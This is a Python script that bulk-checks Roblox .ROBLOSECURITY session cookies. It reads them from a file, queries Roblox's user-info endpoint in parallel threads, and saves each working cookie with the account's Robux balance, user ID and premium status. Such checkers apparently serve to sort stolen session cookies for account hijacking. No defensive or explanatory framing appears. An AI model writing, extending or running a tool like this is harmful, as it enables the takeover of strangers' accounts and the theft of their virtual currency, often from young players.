import requests
import threading
import json

url = "https://www.roblox.com/mobileapi/userinfo"
cookie_file = 'cookies.txt'
output_file = 'valid_cookies.txt'

working_cookies = 0
dead_cookies = 0

with open(cookie_file, 'r') as f:
    cookies = f.readlines()

valid_cookies = []

def check_cookie(cookie):
    global working_cookies, dead_cookies
    cookie = cookie.strip()
    headers = {
        "Cookie": f".ROBLOSECURITY={cookie}"
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200 and "<!DOCTYPE html>" not in response.text:
        data = json.loads(response.text)
        if "RobuxBalance" in data:
            valid_cookies.append((cookie, data["RobuxBalance"], data["UserID"], data["IsAnyBuildersClubMember"], data["IsPremium"]))
            working_cookies += 1
        else:
            dead_cookies += 1
    else:
        dead_cookies += 1

threads = []
for cookie in cookies:
    thread = threading.Thread(target=check_cookie, args=(cookie,))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

with open(output_file, 'w') as f:
    for cookie_info in valid_cookies:
        f.write(f"Cookie: {cookie_info[0]} - robux: {cookie_info[1]} - userid: {cookie_info[2]} - buildersclubmember: {cookie_info[3]} - ispremium: {cookie_info[4]}\n")

print(f"Working cookies: {working_cookies}")
print(f"Dead cookies: {dead_cookies}")
